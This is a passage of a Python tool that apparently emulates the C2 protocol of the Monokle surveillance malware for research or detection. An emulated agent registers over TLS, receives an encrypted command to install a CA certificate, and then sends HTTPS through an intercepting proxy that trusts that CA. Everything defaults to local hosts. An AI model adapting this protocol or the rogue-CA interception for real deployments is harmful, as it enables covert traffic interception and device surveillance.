    with socket.create_connection((args.c2_connect_host, args.c2_port), timeout=10) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname="TEST") as tls_sock:
            reg_thrift = build_agent_registration_thrift(args.device_id, args.agent_id, True)
            registration_payload = wrap_registration(reg_thrift)
            tls_sock.sendall(registration_payload)
            log("client", f"sent AgentRegistration thrift={len(reg_thrift)} total={len(registration_payload)}")

            header = recv_exact(tls_sock, 2)
            encrypted_len = struct.unpack("<H", header)[0]
            frame = header + recv_exact(tls_sock, encrypted_len)
            plaintext = decrypt_server_frame(frame, TRANSPORT_AES_GCM_KEY)
            command = parse_install_certificate_plaintext(plaintext)
            log(
                "client",
                f"received taskType={command.task_type} taskId={command.task_id} "
                f"filename={command.filename!r} certBytes={len(command.certificate_der or b'')}",
            )

            if command.task_type == 1019 and command.certificate_der:
                cert_dir = Path(args.cert_dir)
                cert_dir.mkdir(parents=True, exist_ok=True)
                received_der = cert_dir / "received_installed_ca.der"
                received_pem = cert_dir / "received_installed_ca.pem"
                cert = x509.load_der_x509_certificate(command.certificate_der)
                received_der.write_bytes(command.certificate_der)
                received_pem.write_bytes(cert.public_bytes(serialization.Encoding.PEM))

            response_thrift = build_agent_response_success_thrift(command.task_id or args.task_id)
            response_plaintext = wrap_agent_response_plaintext(response_thrift)
            response_frame = encrypt_client_frame(response_plaintext, TRANSPORT_AES_GCM_KEY)
            tls_sock.sendall(response_frame)
            log("client", f"sent AgentResponse thrift={len(response_thrift)} encrypted={len(response_frame)}")
            return command


def client_oracle_request(args: argparse.Namespace) -> None:
    ca_pem = Path(args.cert_dir) / "received_installed_ca.pem"
    if not ca_pem.exists():
        ca_pem = Path(args.cert_dir) / "installed_ca.pem"
    context = make_client_ssl_context(
        cafile=ca_pem,
        verify=True,
        keylog_file=Path(args.keylog_file) if args.keylog_file else None,
    )
    with socket.create_connection((args.proxy_connect_host, args.proxy_port), timeout=10) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=args.oracle_host) as tls_sock:
            request = (
                f"GET /identity/v1/session HTTP/1.1\r\n"
                f"Host: {args.oracle_host}\r\n"
                "User-Agent: AndroidDownloadManager/9\r\n"
                "Accept: application/json\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode("ascii")
            tls_sock.sendall(request)
            response = read_tls_response(tls_sock)
            first_line = response.split(b"\r\n", 1)[0].decode("ascii", errors="replace")
            log("client", f"oracle-like HTTPS response {first_line}")
            close_tls_gracefully(tls_sock)


def run_client(args: argparse.Namespace, stop: threading.Event) -> None:
    while not stop.is_set():
        command = client_c2_exchange(args)
        if command and command.task_type == 1019:
            client_oracle_request(args)
        if not args.loop:
            break
        stop.wait(args.period)


def run_all(args: argparse.Namespace, stop: threading.Event) -> None:
    ensure_cert_material(Path(args.cert_dir), args.oracle_host, args.regen_certs)
    threads = [
        threading.Thread(target=run_origin_server, args=(args, stop), daemon=True),
        threading.Thread(target=run_proxy_server, args=(args, stop), daemon=True),
        threading.Thread(target=run_c2_server, args=(args, stop), daemon=True),
    ]
    for thread in threads:
        thread.start()
    time.sleep(args.start_delay)
    run_client(args, stop)
    if args.keep_alive:
        while not stop.is_set():
            stop.wait(0.5)
    else:
        stop.set()
        time.sleep(0.5)


def selftest(args: argparse.Namespace) -> None:
    cert_dir = Path(args.cert_dir)
    paths = ensure_cert_material(cert_dir, args.oracle_host, args.regen_certs)
    ca_der = paths["installed_ca_der"].read_bytes()

    reg_thrift = build_agent_registration_thrift("device-001", DEFAULT_AGENT_ID, True)
    reg_payload = wrap_registration(reg_thrift)
    parsed_reg = parse_agent_registration_payload(reg_payload)
    assert parsed_reg == AgentRegistrationData("device-001", DEFAULT_AGENT_ID, True)

    command_thrift = build_server_command_install_certificate_thrift(
        DEFAULT_CA_FILENAME,
        ca_der,
        DEFAULT_TASK_ID,
        1700000000,
    )
    command_plain = wrap_server_command_plaintext(command_thrift)
    iv = bytes(range(16))
    command_frame = encrypt_server_frame(command_plain, TRANSPORT_AES_GCM_KEY, iv)
    parsed_command = parse_install_certificate_plaintext(
        decrypt_server_frame(command_frame, TRANSPORT_AES_GCM_KEY)
    )
    assert parsed_command.task_id == DEFAULT_TASK_ID
    assert parsed_command.task_type == 1019
    assert parsed_command.filename == DEFAULT_CA_FILENAME
    assert parsed_command.certificate_der == ca_der

    response_thrift = build_agent_response_success_thrift(DEFAULT_TASK_ID)
    response_plain = wrap_agent_response_plaintext(response_thrift)
    response_frame = encrypt_client_frame(response_plain, TRANSPORT_AES_GCM_KEY, iv)
    parsed_response = parse_agent_response_plaintext(
        decrypt_client_frame(response_frame, TRANSPORT_AES_GCM_KEY)
    )
    assert parsed_response == AgentResponseData(category=0, task_id=DEFAULT_TASK_ID)

    server_context = make_server_ssl_context(paths["c2_cert"], paths["c2_key"])
    client_context = make_client_ssl_context(verify=False)
    server_raw, client_raw = socket.socketpair()
    server_errors: list[BaseException] = []
    server_shutdown: list[bool] = []

    def tls_server() -> None:
        try:
            with server_raw:
                with server_context.wrap_socket(server_raw, server_side=True) as tls_sock:
                    assert recv_exact(tls_sock, 4) == b"ping"
                    tls_sock.sendall(b"pong")
                    server_shutdown.append(close_tls_gracefully(tls_sock))
        except BaseException as exc:
            server_errors.append(exc)

    server_thread = threading.Thread(target=tls_server)
    server_thread.start()
    with client_raw:
        with client_context.wrap_socket(client_raw, server_hostname="TEST") as tls_sock:
            tls_sock.sendall(b"ping")
            assert recv_exact(tls_sock, 4) == b"pong"
            client_shutdown = close_tls_gracefully(tls_sock)
    server_thread.join(timeout=3.0)
    assert not server_thread.is_alive(), "graceful TLS shutdown deadlocked"
    assert not server_errors, server_errors
    assert client_shutdown and server_shutdown == [True]

    print("selftest ok")
    print(f"agent_registration_thrift_hex={reg_thrift.hex()}")
    print(f"server_command_thrift_len={len(command_thrift)}")
    print(f"server_command_frame_len={len(command_frame)}")
    print(f"agent_response_thrift_hex={response_thrift.hex()}")


def add_common_args(parser: argparse.ArgumentParser) -> None:
    base_dir = Path(__file__).resolve().parent
    parser.add_argument("--cert-dir", default=str(base_dir / "certs"))
    parser.add_argument("--regen-certs", action="store_true")
    parser.add_argument("--oracle-host", default=DEFAULT_ORACLE_HOST)
    parser.add_argument("--ca-filename", default=DEFAULT_CA_FILENAME)
    parser.add_argument("--task-id", type=int, default=DEFAULT_TASK_ID)
    parser.add_argument("--c2-port", type=int, default=MONOKLE_C2_PORT)
    parser.add_argument("--proxy-port", type=int, default=DEFAULT_PROXY_PORT)
    parser.add_argument("--origin-port", type=int, default=DEFAULT_ORIGIN_PORT)
    parser.add_argument("--c2-bind", default="0.0.0.0")
    parser.add_argument("--proxy-bind", default="0.0.0.0")
    parser.add_argument("--origin-bind", default="127.0.0.1")
    parser.add_argument("--c2-connect-host", default="127.0.0.1")
    parser.add_argument("--proxy-connect-host", default="127.0.0.1")
    parser.add_argument("--origin-connect-host", default="127.0.0.1")
    parser.add_argument("--device-id", default="android-351756051523999")
    parser.add_argument("--agent-id", type=int, default=DEFAULT_AGENT_ID)
    parser.add_argument("--period", type=int, default=DEFAULT_PERIOD)
    parser.add_argument("--keylog-file")


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Monokle C2 and TLS interception traffic emulator")
    subparsers = parser.add_subparsers(dest="command", required=True)

    for command in ("all", "c2", "client", "proxy", "origin", "selftest"):
        sub = subparsers.add_parser(command)
        add_common_args(sub)
        if command == "all":
            sub.add_argument("--keep-alive", action="store_true")
            sub.add_argument("--start-delay", type=float, default=1.0)
            sub.add_argument("--loop", action="store_true")
        elif command == "client":
            sub.add_argument("--loop", action="store_true")
        else:
            sub.set_defaults(loop=False)
    return parser.parse_args(argv)


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    stop = threading.Event()
    try:
        if args.command == "selftest":
            selftest(args)
        elif args.command == "c2":
            run_c2_server(args, stop)
        elif args.command == "origin":
            run_origin_server(args, stop)
        elif args.command == "proxy":
            run_proxy_server(args, stop)
        elif args.command == "client":
            run_client(args, stop)
        elif args.command == "all":
            run_all(args, stop)
        else:
            raise ValueError(args.command)
        return 0
    except KeyboardInterrupt:
        stop.set()
        log("main", "interrupted by Ctrl+C")
        return 130
    except OSError as exc:
        stop.set()
        log("main", f"socket error: {exc}")
        return 1
    finally:
        stop.set()
        with contextlib.suppress(Exception):
            time.sleep(0.2)


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
